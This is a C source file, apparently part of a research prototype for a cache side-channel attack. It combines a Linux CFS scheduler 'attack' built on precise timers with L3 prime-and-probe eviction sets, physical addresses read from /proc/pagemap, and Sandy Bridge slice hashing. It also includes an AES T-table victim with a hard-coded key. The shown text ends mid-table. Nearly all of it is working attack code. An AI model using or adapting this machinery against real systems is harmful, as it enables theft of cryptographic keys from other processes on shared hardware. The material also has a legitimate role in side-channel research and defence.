#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#define __USE_GNU
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <assert.h>
#include <malloc.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <xmmintrin.h>



/******************************************
 *      SYSCALLS IN ASSEMBLY x86-64       *
 ******************************************/

/* inr_ syscalls ignore the return value */
#define inr_syscall0(NO) \
asm volatile ("syscall;" :: "a" ((NO)): "rcx", "r11")
#define inr_syscall1(NO, ARG1) \
asm volatile ("syscall;" :: "a" ((NO)), "D" ((ARG1)) : "rcx", "r11")
#define inr_syscall2(NO, ARG1, ARG2) \
asm volatile ("syscall;" :: "a" ((NO)), "D" ((ARG1)), "S" ((ARG2)) : "rcx", "r11")
#define inr_syscall3(NO, ARG1, ARG2, ARG3) \
asm volatile ("syscall;" :: "a" ((NO)), "D" ((ARG1)), "S" ((ARG2)), "d" ((ARG3)) : "rcx", "r11")
#define inr_syscall4(NO, ARG1, ARG2, ARG3, ARG4) \
asm volatile ("mov %4, %%r10;syscall;" :: "a" ((NO)), "D" ((ARG1)), "S" ((ARG2)), "d" ((ARG3)), "g" ((ARG4)) : "r10", "rcx", "r11")

/* i_ syscalls write the return value in the first parameter */
#define i_syscall3(RET, NO, ARG1, ARG2, ARG3) \
asm volatile ("syscall;" : "=a" ((RET)) : "a" ((NO)), "D" ((ARG1)), "S" ((ARG2)), "d" ((ARG3)) : "rcx", "r11")
#define i_syscall4(RET, NO, ARG1, ARG2, ARG3, ARG4) \
asm volatile ("mov %1, %%eax; mov %5, %%r10;syscall;" : "=a" ((RET)) : "g" ((NO)), "D" ((ARG1)), "S" ((ARG2)), "d" ((ARG3)), "g" ((ARG4)) : "r10", "rcx", "r11")
//asm volatile ("mov %5, %%r10;syscall;" : "=a" ((RET)) : "a" ((unsigned long)(NO)), "D" ((ARG1)), "S" ((ARG2)), "d" ((ARG3)), "g" ((ARG4)) : "r10", "rcx", "r11")

/******************************************
 *         PROCESSES AND THREADS          *
 ******************************************/

/*
 * these counters are placed in a shared memory and are used for syncronizing
 * the CFS attack thread with cache probing thread, without using system calls
 */

static volatile long* advance_ctr;
static volatile long* iteration;
void init_shared() {
  advance_ctr=mmap(NULL, sizeof(long), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  iteration=mmap(NULL, sizeof(long), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  *advance_ctr=0;
  *iteration=0;
}
#define ADVANCE() *advance_ctr = (*advance_ctr) + 1

/* spinlock */
#define WAIT_TO_ADVANCE(x) \
  while((x)>=(*advance_ctr)); \
  x= (*advance_ctr);

struct timespec sleeper = {0, 0};
#define inr_pause() inr_syscall0(__NR_pause)
#define inr_sleep(SEC) sleeper.tv_sec=SEC; inr_syscall2(__NR_nanosleep, &sleeper, NULL)
void set_affinity(int core);
void wakeup() { }
void terminate() { exit(0); }

/* runs a function as a process assigned to a core and returns the pid */
int run_function(int core, void (*func) (void)) {
  pid_t child = fork();
  if(child<0) {
    perror("fork failed");
    exit(EXIT_FAILURE);
  }
  if(child == 0) {
    set_affinity(core);
    func();
    exit(0);
  }
  else
    return child;
}

/* POSIX timer stuff for setting precise alarms */

#define i_timer_create(RET, CLOCK, SE, T) i_syscall3(RET, __NR_timer_create, CLOCK, SE, T)
#define i_timer_settime(RET, T, FLAGS, NEW, OLD) i_syscall4(RET, __NR_timer_settime, T, FLAGS, NEW, OLD)

/*
 * every thread in CFS attack creates an alarm timer for waking themselves
 * and each thread arms the timer of the next thread during the attack
 */
void set_timer(timer_t * t) {
  struct sigevent se;
  long ret;
  se.sigev_notify = SIGEV_THREAD_ID;
  se._sigev_un._tid = syscall(SYS_gettid); //  se.sigev_notify_thread_id = tid;
  se.sigev_signo = SIGALRM;
//  if(timer_create(CLOCK_MONOTONIC, &se, t)==-1) {
  i_timer_create(ret, CLOCK_MONOTONIC, &se, t);
  if(ret!=0) {
    perror("timer creation error\n");
    exit(EXIT_FAILURE);
  }
}

struct itimerspec its = {{0,0}, {0,0}};

#define SET_ALARM(T, NSEC) do{ \
  long ret; \
  its.it_value.tv_nsec = NSEC; \
  i_timer_settime(ret, T, 0, &its, NULL); \
  if (ret != 0) { \
    fprintf(stderr,"ret=%ld i=%d (inval=%d, badf=%d), timers=%p timer=%ld\n",ret,i,EINVAL, EBADF,timers, (long)T); \
    errno = -ret; \
    perror("timer settime error\n"); \
    exit(EXIT_FAILURE); \
  } \
} while(0) //"


//  i_timer_settime(ret, T, 0, &its, NULL);
//  if(ret != 0) {

void set_alarm(timer_t t, long nsec) {
  struct itimerspec its;
  long ret;
  its.it_value.tv_sec = 0;
  its.it_value.tv_nsec = nsec;
  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
//  if (timer_settime(t, 0, &its, NULL) == -1) {
  i_timer_settime(ret, t, 0, &its, NULL);
  if(ret != 0) {
    perror("timer settime error\n");
    exit(EXIT_FAILURE);
  }
}

/******************************************
 *                 TIMING                 *
 ******************************************/
#define time_begin(hi,lo)		\
  asm volatile (			\
	"xor %%eax, %%eax;" 		\
	"cpuid;"			\
	"rdtsc;"			\
	"mov %%edx, %0;"		\
	"mov %%eax, %1;"		\
	: "=g" ((hi)), "=g" ((lo))	\
	:				\
	: "rax", "rbx", "rcx", "rdx");

#define time_end(hi,lo)			\
  asm volatile (			\
	"rdtscp;"			\
	"mov %%edx, %0;"		\
	"mov %%eax, %1;"		\
	"xor %%eax, %%eax;"		\
	"cpuid;"			\
	: "=g" ((hi)), "=g" ((lo))	\
	:				\
	:"rax", "rbx", "rcx", "rdx");

static inline uint64_t readtsc() {
  register unsigned int hi, lo;
  asm volatile ("rdtsc;mov %%edx, %0;mov %%eax, %1;"
                : "=r" (hi), "=r" (lo)
                ::"%rax", "%rbx", "%rcx", "%rdx");
  return  ( ((uint64_t) hi << 32) | lo );
}

void busy_wait() {
  uint64_t current=0, prev=0;
  while(prev==0 || current-prev<10000) {
    prev = current;
    current = readtsc();
  }
}

/* busy wait for a given time */
#define FDELAY(D) do {\
    register uint64_t now = readtsc(); \
    while(readtsc() <= now+D) _mm_pause(); \
  } while(0)

void delay(uint64_t delay) {
  uint64_t now = readtsc();
  while(readtsc() <= now+delay);
}

/******************************************
 *           CACHE AND HASHING            *
 ******************************************/

#define PAGE_SIZE	(4*1024)
#define HUGEPAGE_SIZE	(2*1024*1024)
//#define SET_COUNT	64
#define SET_COUNT   8192
// #define SET_COUNT	8192
#define CACHE_WAYS	16
#define CACHE_LINE	64
#define SET_PER_PAGE	64

/* linked list structures for the allocated memory */

struct line{
  struct line* next;
  uint8_t way_count;
  char padding[CACHE_LINE-(sizeof(struct line*)+sizeof(uint8_t))];
};
struct way{
  struct line lines[SET_PER_PAGE];
};
struct table{
  struct way* ways[CACHE_WAYS];
};

void insert_line(struct line** head, struct line** tail, struct line* item) {
  item->next = NULL;
  if((*head) == NULL) {
    (*head) = item;
    (*tail) = item;
  }
  else {
    (*tail)->next = item;
    (*tail) = item;
  }
}

void free_list(struct line* head) {
  struct line* h = head;
  struct line* i;

  while(h != NULL) {
    i = h->next;
    free(h);
//    munmap(h, HUGEPAGE_SIZE);
    h = i;
  }
}

/* sandybridge hashing for L3 index from physical address */

unsigned long bit(uint64_t x, unsigned long b) { return (x>>b)&1; }
unsigned long hash_up(uint64_t x) {
  unsigned long h1, h0;

  h1 =  bit(x,17) ^ bit(x,18) ^ bit(x,20) ^ bit(x,22) ^ bit(x,24) ^ bit(x,25) ^
        bit(x,26) ^ bit(x,27) ^ bit(x,28) ^ bit(x,30) ^ bit(x,32) ^ bit(x,33);

  h0 =  bit(x,18) ^ bit(x,19) ^ bit(x,21) ^ bit(x,23) ^ bit(x,25) ^ bit(x,27) ^
        bit(x,29) ^ bit(x,30) ^ bit(x,31) ^ bit(x,32) ^ bit(x,34);
  return (h1<<1)+h0;
}
#ifdef USE_ANDROID
unsigned long hash(uint64_t x) {
  return x;
}
#else
unsigned long hash(uint64_t x) {
  unsigned long r = x % (1<<17);
  return (hash_up(x)<<17)+r;
}
#endif

/* the 2-bit value here determines the cache bank. cavity one is the bank-00 */
unsigned long cavity(unsigned long x) {
  unsigned long r, h1, h0;
  h1 =  bit(x, 6) ^ bit(x, 7) ^ bit(x,10) ^ bit(x,11) ^ bit(x,12) ^ bit(x,13) ^
        bit(x,14) ^ bit(x,15) ^ bit(x,16) ^ bit(hash_up(x),0); //bit(x,17);
  h0 =  bit(x, 6) ^ bit(x,10) ^ bit(x,12) ^ bit(x,14) ^ bit(x,16) ^ bit(hash_up(x),1);//bit(x,18);
  r = (h1<<1)+h0;
  return r;
}

unsigned long weirdly_misses(unsigned long x) {
#if NO_CAVITY
  return 0;
#endif
  if(cavity(x)==0)
    return 1;
  else
    return 0;
}

uint64_t virtual_to_physical(FILE* f, unsigned long virt_address);

/* allocate an aligned memory page with a given hash as its base.
 * a list is maintained for mismatching pages to be freed later. */
unsigned long get_page_with_hash(unsigned long target_hash, FILE* self_pm, struct line** free_head, struct line** free_tail) {
//  struct line* page_base;
  struct line* page;
  int r;
  unsigned long virt;
  uint64_t phys;
  unsigned long h;
  while(1) {
    r = posix_memalign((void**)&page, PAGE_SIZE, PAGE_SIZE);
    if(r!=0 || page==NULL) {
      printf("posix memalign error\n");
    }
//    page_base = mmap(NULL, HUGEPAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB, -1, 0);
//    if(page_base==MAP_FAILED) {
//      perror("hugepage allocate error");
//      exit(EXIT_FAILURE);
//    }
//    page = (struct line*) ((unsigned long) page_base + target_hash % (1<<17));
//    fprintf(stderr,"allocated huge page: %p\n",page);
    memset(page, 0, CACHE_LINE);
    virt = (unsigned long) page;
    phys = virtual_to_physical(self_pm, virt);
    h = hash(phys);
    if(h != target_hash) {
      insert_line(free_head, free_tail, page);
    }
    else {
      return virt;
    }
  }
}

/* arrange the table of cache lines to be primed by allocating pages */
void fill_table(unsigned long target_hash, FILE* self_pm, struct table* table) {
  unsigned int w, s;
  unsigned long alias_page, virt, phys;
  struct line* free_head = NULL;
  struct line* free_tail = NULL;

//  target_hash = 0;
  if(target_hash>0x7FFFF) {
    fprintf(stderr, "invalid target hash %lX\n", target_hash);
    exit(EXIT_FAILURE);
  }
  for(w = 0; w < CACHE_WAYS; w++) {
    alias_page = get_page_with_hash(target_hash, self_pm, &free_head, &free_tail);
//    fprintf(stderr,"allocating pages with hash 0x%lX (%d of %d).%c", target_hash, w+1, CACHE_WAYS, (w+1<CACHE_WAYS)?'\r':'\n');fflush(stderr);
    table->ways[w] = (struct way*) alias_page;
    for(s = 0; s < SET_PER_PAGE; s++) {
      virt = (unsigned long)(&table->ways[0]->lines[s]);
      phys = virtual_to_physical(self_pm, virt);
      table->ways[w]->lines[s].way_count = CACHE_WAYS - weirdly_misses(phys);
    }
  }
  free_list(free_head);
}

/* use a deck of numbers from 1 to SET_COUNT and shuffle for permuted access */
unsigned int deck[SET_COUNT];

void shuffle() {
  unsigned int i;
  unsigned int j;
  unsigned int tmp;
  for(i = 0; i < SET_COUNT; i++) {
    deck[i] = i;
  }
  return;
  srand(456);
  for(i = (SET_COUNT-1); i>=1; i--) {
    j = rand() % (i+1);
    tmp = deck[i];
    deck[i] = deck[j];
    deck[j] = tmp;
  }
}

/* use the shuffled deck and link the cache lines together */
void shuffle_link_lines(struct line** head, struct line** tail, struct table* t) {
  int w, s, l, si;
  struct table* table;
  shuffle();
  // for(si = 0; si < SET_COUNT; si++) {
  for(si = 0; si < SET_PER_PAGE; si++) {
    // fprintf(stderr, "\n%d ", si);
    table = &t[si/SET_PER_PAGE];
    s = deck[si];
    l = s%SET_PER_PAGE;
    for(w=0; w< CACHE_WAYS-table->ways[0]->lines[l].way_count; w++) {
      insert_line(head, tail, (struct line*) &table->ways[w]->lines[l].padding[23]);
    }
    for(w = 0; w < table->ways[0]->lines[l].way_count; w++) {
      insert_line(head, tail, &table->ways[w]->lines[l]);
    }
  }
}

/* print to a file, the virtual and physical addresses, hashes, and way counts
 * for each cache line of the linked list */
void print_addresses(struct line* head, FILE* self_pm, FILE* out) {
  struct line* i=head;
  unsigned int w;
  unsigned long virt, phys;
  while(i!=NULL) {
    for(w=0; w<CACHE_WAYS;w++) {
      virt = (unsigned long)i;
      phys = virtual_to_physical(self_pm, virt);
      fprintf(out, "%u: %lx-%lx-%4lx(%d)\t", w, virt, phys, hash(phys), i->way_count);
      i=i->next;
    }
    fprintf(out, "\n");
  }
}

/******************************************
 *                  MISC                  *
 ******************************************/
/* assign the process to a core */
void set_affinity(int coreid) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(coreid, &mask);
  if(sched_setaffinity( 0, sizeof(mask), &mask ) == -1 ) {
    perror("WARNING: Could not set CPU Affinity, continuing...\n");
  }
}


/******************************************
 *              TRANSLATION               *
 ******************************************/

/* functions for opening and reading /proc/[pid]/pagemap file */

#define MASK_PFN_BITS           55
#define MASK_PFN                ((1UL<<MASK_PFN_BITS) - 1)
#define MASK_SWAP_TYPE_BITS     5
#define MASK_SWAP_TYPE          ((1UL<<MASK_SWAP_TYPE_BITS) - 1)
#define MASK_SWAP_OFFSET        (MASK_PFN - MASK_SWAP_TYPE)
#define MASK_PAGE_SHIFT         ((1UL<<61) - 1 - MASK_PFN)
#define MASK_FROM_FILE          (1UL<<61)
#define MASK_SWAPPED            (1UL<<62)
#define MASK_PRESENT            (1UL<<63)

#define LINE_SIZE               512
#define PAGEMAP_ENTRY_SIZE      8

FILE* open_pagemap_file(int pid) {
  char path[LINE_SIZE];
  int c;

  c = snprintf(path, LINE_SIZE, "/proc/%d/pagemap", pid);
  if(c < 0 || c >= LINE_SIZE)
    return NULL;

  return fopen(path, "r");
}

uint64_t virtual_to_physical(FILE* f, unsigned long virt_address) {

  unsigned long offset;
  uint64_t pfn;
  unsigned char present;
  unsigned char swapped;
  uint64_t pagemap_entry;
//  uint8_t shift;
  unsigned long index;
  off_t o;
  ssize_t t;

  index = (virt_address / PAGE_SIZE) * PAGEMAP_ENTRY_SIZE;
  o= lseek(fileno(f), index, SEEK_SET);
  if(o<0 || (unsigned long) o!=index) {
    fprintf(stderr, "seek error\n");
    return 0;
  }
  t = read(fileno(f), &pagemap_entry, PAGEMAP_ENTRY_SIZE);
  if(t<0) {
    fprintf(stderr, "read error\n");
    return 0;
  }

  present = ((pagemap_entry & MASK_PRESENT)==0) ? 0 : 1;
  swapped = ((pagemap_entry & MASK_SWAPPED)==0) ? 0 : 1;

  if(!present || swapped) {
//    fprintf(stderr, "not present or swapped\n");
    return 0;
  }

//  shift = (pagemap_entry & MASK_PAGE_SHIFT) >> MASK_PFN_BITS;
  offset = virt_address % PAGE_SIZE;


//  fprintf(stderr, "v: %lx offset:%lx index:%lx t:%ld pe:%lx shift:%u\n", virt_address, offset, index, t, pagemap_entry, shift);

  pfn = pagemap_entry & MASK_PFN;
  return (pfn * PAGE_SIZE) + offset;
}


/******************************************
 *               LOGGING                  *
 ******************************************/
#define LOGSIZE         100000000

enum log_type {
START,
END,
};

char* log_file;
uint64_t log_time[LOGSIZE];
int log_tid[LOGSIZE];
enum log_type log_type[LOGSIZE];
volatile unsigned int idx;
#define LOGIT(s, t, i)                  \
        do {                            \
          log_time[idx] = (s);          \
          log_type[idx] = (t);          \
          log_tid[idx] = (i);           \
          idx = idx + 1;                \
        } while(0)

#define LOG(t)          LOGI((t), -1)
#define LOGA(t)         LOGI((t), -2)
#define LOGT(s, t)      LOGIT((s), (t), -1)
#define LOGAT(s, t)     LOGIT((s), (t), -2)
#define LOGI(x, t)      LOGIT(readtsc(), (x), (t))


void print_log() {
  int i;
  fprintf(stderr, "file=%s\n", log_file);
  FILE* f = fopen(log_file, "w");
  fprintf(stderr, "advance=%ld\n", *advance_ctr);
  fprintf(stderr, "IDX=%d\n", idx);
  for(i=0;i<idx;i++) {
    fprintf(f, "%ld %d %d\n", log_time[i], log_type[i], log_tid[i]);
  }
}


/******************************************
 *                 AES                    *
 ******************************************/

/* key schedule, and input are hard coded here.
 * we just run the AES encryption below over and over as the victim process */

#define AES_128_ROUND	10
struct aes_key_st {
    uint32_t rd_key[4 *(AES_128_ROUND + 1)];
    int rounds;
};
typedef struct aes_key_st AES_KEY;

AES_KEY key_ref = {{
  0x63BCABF8, 0x6A9A9918, 0x64777C63, 0x1C5B7617, 0x5B845B64, 0x311EC27C, 0x5569BE1F, 0x4932C808, 0x7A6C6B5F, 0x4B72A923, 0x1E1B173C, 0x5729DF34, 0xDBF27304, 0x9080DA27, 0x8E9BCD1B, 0xD9B2122F,
  0xE43B6631, 0x74BBBC16, 0xFA20710D, 0x23926322, 0xBBC0F517, 0xCF7B4901, 0x355B380C, 0x16C95B2E, 0x46F9C450, 0x89828D51, 0xBCD9B55D, 0xAA10EE73, 0xCCD14BFC, 0x4553C6AD, 0xF98A73F0, 0x539A9D83,
  0xF48FA711, 0xB1DC61BC, 0x4856124C, 0x1BCC8FCF, 0xA4FC2DBE, 0x15204C02, 0x5D765E4E, 0x46BAD181, 0x66C221E4, 0x73E26DE6, 0x2E9433A8, 0x682EE229}, AES_128_ROUND };

unsigned char in_ref[16] = {0x01, 0xFC, 0xF4, 0xD3, 0x46, 0xD7, 0x03, 0x5F, 0xE6, 0x87, 0x7F, 0xBD, 0x21, 0x7E, 0xF6, 0x9B};

unsigned char out_ref[16] = {0x03, 0x15, 0x6A, 0xD7, 0x78, 0x91, 0x6D, 0xD4, 0x08, 0x3E, 0x47, 0xE2, 0xF0, 0x26, 0x64, 0xE8};

unsigned char set_ref[160] = {
  54, 36, 16,  8, 50, 47, 24,  2, 56, 34, 21,  4, 51, 36, 25, 13,
  51, 45, 30, 14, 54, 46, 26, 13, 53, 44, 20,  5, 59, 33, 27,  8,
  52, 34, 28,  3, 49, 37, 26,  1, 63, 47, 29, 11, 52, 36, 21, 13,
  48, 46, 27,  7, 50, 33, 27,  5, 53, 44, 25, 10, 55, 46, 27,  9,
  54, 36, 26,  3, 50, 33, 23,  4, 55, 45, 28,  3, 50, 41, 18, 11,
  49, 35, 19,  1, 52, 36, 22,  1, 57, 35, 21, 15, 49, 46, 16, 10,
  55, 40, 29,  8, 60, 41, 29, 10, 52, 32, 25, 10, 58, 38, 16, 14,
  61, 46, 25, 11, 53, 44, 23,  0, 58, 32, 23,  9, 55, 41, 22, 12,
  52, 34, 30,  7, 61, 45, 24,  8, 52, 41, 16,  4, 51, 37, 31,  6,
  27,  0, 60, 38, 25,  8, 53, 42, 18,  6, 60, 37, 30, 11, 61, 45};

static const uint32_t Te0[256] __attribute__((aligned(1024))) = {
  0xc66363a5, 0xf87c7c84, 0xee777799, 0xf67b7b8d, 0xfff2f20d, 0xd66b6bbd, 0xde6f6fb1, 0x91c5c554, 0x60303050, 0x02010103, 0xce6767a9, 0x562b2b7d, 0xe7fefe19, 0xb5d7d762, 0x4dababe6, 0xec76769a,
  0x8fcaca45, 0x1f82829d, 0x89c9c940, 0xfa7d7d87, 0xeffafa15, 0xb25959eb, 0x8e4747c9, 0xfbf0f00b, 0x41adadec, 0xb3d4d467, 0x5fa2a2fd, 0x45afafea, 0x239c9cbf, 0x53a4a4f7, 0xe4727296, 0x9bc0c05b,
  0x75b7b7c2, 0xe1fdfd1c, 0x3d9393ae, 0x4c26266a, 0x6c36365a, 0x7e3f3f41, 0xf5f7f702, 0x83cccc4f, 0x6834345c, 0x51a5a5f4, 0xd1e5e534, 0xf9f1f108, 0xe2717193, 0xabd8d873, 0x62313153, 0x2a15153f,
  0x0804040c, 0x95c7c752, 0x46232365, 0x9dc3c35e, 0x30181828, 0x379696a1, 0x0a05050f, 0x2f9a9ab5, 0x0e070709, 0x24121236, 0x1b80809b, 0xdfe2e23d, 0xcdebeb26, 0x4e272769, 0x7fb2b2cd, 0xea75759f,
  0x1209091b, 0x1d83839e, 0x582c2c74, 0x341a1a2e, 0x361b1b2d, 0xdc6e6eb2, 0xb45a5aee, 0x5ba0a0fb, 0xa45252f6, 0x763b3b4d, 0xb7d6d661, 0x7db3b3ce, 0x5229297b, 0xdde3e33e, 0x5e2f2f71, 0x13848497,
  0xa65353f5, 0xb9d1d168, 0x00000000, 0xc1eded2c, 0x40202060, 0xe3fcfc1f, 0x79b1b1c8, 0xb65b5bed, 0xd46a6abe, 0x8dcbcb46, 0x67bebed9, 0x7239394b, 0x944a4ade, 0x984c4cd4, 0xb05858e8, 0x85cfcf4a,
  0xbbd0d06b, 0xc5efef2a, 0x4faaaae5, 0xedfbfb16, 0x864343c5, 0x9a4d4dd7, 0x66333355, 0x11858594, 0x8a4545cf, 0xe9f9f910, 0x04020206, 0xfe7f7f81, 0xa05050f0, 0x783c3c44, 0x259f9fba, 0x4ba8a8e3,
  0xa25151f3, 0x5da3a3fe, 0x804040c0, 0x058f8f8a, 0x3f9292ad, 0x219d9dbc, 0x70383848, 0xf1f5f504, 0x63bcbcdf, 0x77b6b6c1, 0xafdada75, 0x42212163, 0x20101030, 0xe5ffff1a, 0xfdf3f30e, 0xbfd2d26d,
  0x81cdcd4c, 0x180c0c14, 0x26131335, 0xc3ecec2f, 0xbe5f5fe1, 0x359797a2, 0x884444cc, 0x2e171739, 0x93c4c457, 0x55a7a7f2, 0xfc7e7e82, 0x7a3d3d47, 0xc86464ac, 0xba5d5de7, 0x3219192b, 0xe6737395,
  0xc06060a0, 0x19818198, 0x9e4f4fd1, 0xa3dcdc7f, 0x44222266, 0x542a2a7e, 0x3b9090ab, 0x0b888883, 0x8c4646ca, 0xc7eeee29, 0x6bb8b8d3, 0x2814143c, 0xa7dede79, 0xbc5e5ee2, 0x160b0b1d, 0xaddbdb76,
  0xdbe0e03b, 0x64323256, 0x743a3a4e, 0x140a0a1e, 0x924949db, 0x0c06060a, 0x4824246c, 0xb85c5ce4, 0x9fc2c25d, 0xbdd3d36e, 0x43acacef, 0xc46262a6, 0x399191a8, 0x319595a4, 0xd3e4e437, 0xf279798b,
  0xd5e7e732, 0x8bc8c843, 0x6e373759, 0xda6d6db7, 0x018d8d8c, 0xb1d5d564, 0x9c4e4ed2, 0x49a9a9e0, 0xd86c6cb4, 0xac5656fa, 0xf3f4f407, 0xcfeaea25, 0xca6565af, 0xf47a7a8e, 0x47aeaee9, 0x10080818,
  0x6fbabad5, 0xf0787888, 0x4a25256f, 0x5c2e2e72, 0x381c1c24, 0x57a6a6f1, 0x73b4b4c7, 0x97c6c651, 0xcbe8e823, 0xa1dddd7c, 0xe874749c, 0x3e1f1f21, 0x964b4bdd, 0x61bdbddc, 0x0d8b8b86, 0x0f8a8a85,
  0xe0707090, 0x7c3e3e42, 0x71b5b5c4, 0xcc6666aa, 0x904848d8, 0x06030305, 0xf7f6f601, 0x1c0e0e12, 0xc26161a3, 0x6a35355f, 0xae5757f9, 0x69b9b9d0, 0x17868691, 0x99c1c158, 0x3a1d1d27, 0x279e9eb9,
  0xd9e1e138, 0xebf8f813, 0x2b9898b3, 0x22111133, 0xd26969bb, 0xa9d9d970, 0x078e8e89, 0x339494a7, 0x2d9b9bb6, 0x3c1e1e22, 0x15878792, 0xc9e9e920, 0x87cece49, 0xaa5555ff, 0x50282878, 0xa5dfdf7a,
  0x038c8c8f, 0x59a1a1f8, 0x09898980, 0x1a0d0d17, 0x65bfbfda, 0xd7e6e631, 0x844242c6, 0xd06868b8, 0x824141c3, 0x299999b0, 0x5a2d2d77, 0x1e0f0f11, 0x7bb0b0cb, 0xa85454fc, 0x6dbbbbd6, 0x2c16163a,
};
static const uint32_t Te1[256] __attribute__((aligned(1024))) = {
  0xa5c66363, 0x84f87c7c, 0x99ee7777, 0x8df67b7b, 0x0dfff2f2, 0xbdd66b6b, 0xb1de6f6f, 0x5491c5c5, 0x50603030, 0x03020101, 0xa9ce6767, 0x7d562b2b, 0x19e7fefe, 0x62b5d7d7, 0xe64dabab, 0x9aec7676,
  0x458fcaca, 0x9d1f8282, 0x4089c9c9, 0x87fa7d7d, 0x15effafa, 0xebb25959, 0xc98e4747, 0x0bfbf0f0, 0xec41adad, 0x67b3d4d4, 0xfd5fa2a2, 0xea45afaf, 0xbf239c9c, 0xf753a4a4, 0x96e47272, 0x5b9bc0c0,
  0xc275b7b7, 0x1ce1fdfd, 0xae3d9393, 0x6a4c2626, 0x5a6c3636, 0x417e3f3f, 0x02f5f7f7, 0x4f83cccc, 0x5c683434, 0xf451a5a5, 0x34d1e5e5, 0x08f9f1f1, 0x93e27171, 0x73abd8d8, 0x53623131, 0x3f2a1515,
  0x0c080404, 0x5295c7c7, 0x65462323, 0x5e9dc3c3, 0x28301818, 0xa1379696, 0x0f0a0505, 0xb52f9a9a, 0x090e0707, 0x36241212, 0x9b1b8080, 0x3ddfe2e2, 0x26cdebeb, 0x694e2727, 0xcd7fb2b2, 0x9fea7575,
  0x1b120909, 0x9e1d8383, 0x74582c2c, 0x2e341a1a, 0x2d361b1b, 0xb2dc6e6e, 0xeeb45a5a, 0xfb5ba0a0, 0xf6a45252, 0x4d763b3b, 0x61b7d6d6, 0xce7db3b3, 0x7b522929, 0x3edde3e3, 0x715e2f2f, 0x97138484,
  0xf5a65353, 0x68b9d1d1, 0x00000000, 0x2cc1eded, 0x60402020, 0x1fe3fcfc, 0xc879b1b1, 0xedb65b5b, 0xbed46a6a, 0x468dcbcb, 0xd967bebe, 0x4b723939, 0xde944a4a, 0xd4984c4c, 0xe8b05858, 0x4a85cfcf,
  0x6bbbd0d0, 0x2ac5efef, 0xe54faaaa, 0x16edfbfb, 0xc5864343, 0xd79a4d4d, 0x55663333, 0x94118585, 0xcf8a4545, 0x10e9f9f9, 0x06040202, 0x81fe7f7f, 0xf0a05050, 0x44783c3c, 0xba259f9f, 0xe34ba8a8,
  0xf3a25151, 0xfe5da3a3, 0xc0804040, 0x8a058f8f, 0xad3f9292, 0xbc219d9d, 0x48703838, 0x04f1f5f5, 0xdf63bcbc, 0xc177b6b6, 0x75afdada, 0x63422121, 0x30201010, 0x1ae5ffff, 0x0efdf3f3, 0x6dbfd2d2,
  0x4c81cdcd, 0x14180c0c, 0x35261313, 0x2fc3ecec, 0xe1be5f5f, 0xa2359797, 0xcc884444, 0x392e1717, 0x5793c4c4, 0xf255a7a7, 0x82fc7e7e, 0x477a3d3d, 0xacc86464, 0xe7ba5d5d, 0x2b321919, 0x95e67373,
  0xa0c06060, 0x98198181, 0xd19e4f4f, 0x7fa3dcdc, 0x66442222, 0x7e542a2a, 0xab3b9090, 0x830b8888, 0xca8c4646, 0x29c7eeee, 0xd36bb8b8, 0x3c281414, 0x79a7dede, 0xe2bc5e5e, 0x1d160b0b, 0x76addbdb,
  0x3bdbe0e0, 0x56643232, 0x4e743a3a, 0x1e140a0a, 0xdb924949, 0x0a0c0606, 0x6c482424, 0xe4b85c5c, 0x5d9fc2c2, 0x6ebdd3d3, 0xef43acac, 0xa6c46262, 0xa8399191, 0xa4319595, 0x37d3e4e4, 0x8bf27979,
  0x32d5e7e7, 0x438bc8c8, 0x596e3737, 0xb7da6d6d, 0x8c018d8d, 0x64b1d5d5, 0xd29c4e4e, 0xe049a9a9, 0xb4d86c6c, 0xfaac5656, 0x07f3f4f4, 0x25cfeaea, 0xafca6565, 0x8ef47a7a, 0xe947aeae, 0x18100808,
  0xd56fbaba, 0x88f07878, 0x6f4a2525, 0x725c2e2e, 0x24381c1c, 0xf157a6a6, 0xc773b4b4, 0x5197c6c6, 0x23cbe8e8, 0x7ca1dddd, 0x9ce87474, 0x213e1f1f, 0xdd964b4b, 0xdc61bdbd, 0x860d8b8b, 0x850f8a8a,
  0x90e07070, 0x427c3e3e, 0xc471b5b5, 0xaacc6666, 0xd8904848, 0x05060303, 0x01f7f6f6, 0x121c0e0e, 0xa3c26161, 0x5f6a3535, 0xf9ae5757, 0xd069b9b9, 0x91178686, 0x5899c1c1, 0x273a1d1d, 0xb9279e9e,
  0x38d9e1e1, 0x13ebf8f8, 0xb32b9898, 0x33221111, 0xbbd26969, 0x70a9d9d9, 0x89078e8e, 0xa7339494, 0xb62d9b9b, 0x223c1e1e, 0x92158787, 0x20c9e9e9, 0x4987cece, 0xffaa5555, 0x78502828, 0x7aa5dfdf,
  0x8f038c8c, 0xf859a1a1, 0x80098989, 0x171a0d0d, 0xda65bfbf, 0x31d7e6e6, 0xc6844242, 0xb8d06868, 0xc3824141, 0xb0299999, 0x775a2d2d, 0x111e0f0f, 0xcb7bb0b0, 0xfca85454, 0xd66dbbbb, 0x3a2c1616,
};
static const uint32_t Te2[256] __attribute__((aligned(1024))) = {
  0x63a5c663, 0x7c84f87c, 0x7799ee77, 0x7b8df67b, 0xf20dfff2, 0x6bbdd66b, 0x6fb1de6f, 0xc55491c5, 0x30506030, 0x01030201, 0x67a9ce67, 0x2b7d562b, 0xfe19e7fe, 0xd762b5d7, 0xabe64dab, 0x769aec76,
  0xca458fca, 0x829d1f82, 0xc94089c9, 0x7d87fa7d, 0xfa15effa, 0x59ebb259, 0x47c98e47, 0xf00bfbf0, 0xadec41ad, 0xd467b3d4, 0xa2fd5fa2, 0xafea45af, 0x9cbf239c, 0xa4f753a4, 0x7296e472, 0xc05b9bc0,
  0xb7c275b7, 0xfd1ce1fd, 0x93ae3d93, 0x266a4c26, 0x365a6c36, 0x3f417e3f, 0xf702f5f7, 0xcc4f83cc, 0x345c6834, 0xa5f451a5, 0xe534d1e5, 0xf108f9f1, 0x7193e271, 0xd873abd8, 0x31536231, 0x153f2a15,
